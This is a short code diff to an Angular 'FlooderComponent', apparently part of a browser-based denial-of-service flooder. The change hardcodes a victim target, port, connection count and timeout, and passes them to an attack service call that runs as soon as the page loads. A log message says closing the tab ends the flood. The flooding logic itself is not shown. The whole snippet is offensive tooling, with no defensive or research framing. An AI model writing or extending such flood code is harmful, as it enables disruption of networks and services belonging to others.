@@ -14,10 +14,15 @@ export class FlooderComponent implements OnInit {
   }
 
   ngOnInit() {
+    let target: String = 'lanVictim'; //@todo refine
+    let port: Number = 80; //@todo refine
+    let maxConnections: Number = 10; //@todo refine
+    let timeout: Number = 1.5; //@todo refine
     if (this._logger.isDebugEnabled) {
       this._logger.debug('FlooderComponent: Initiating flood now.');
     }
-    this._floodService.attack();
+    // target: String, port: Number, maxConnections: Number, timeout: Number
+    this._floodService.attack(target, port, maxConnections, timeout);
     if (this._logger.isDebugEnabled) {
       this._logger.debug('FlooderComponent: Flood is ongoing. Close your browser tab to terminate the flood.');
     }
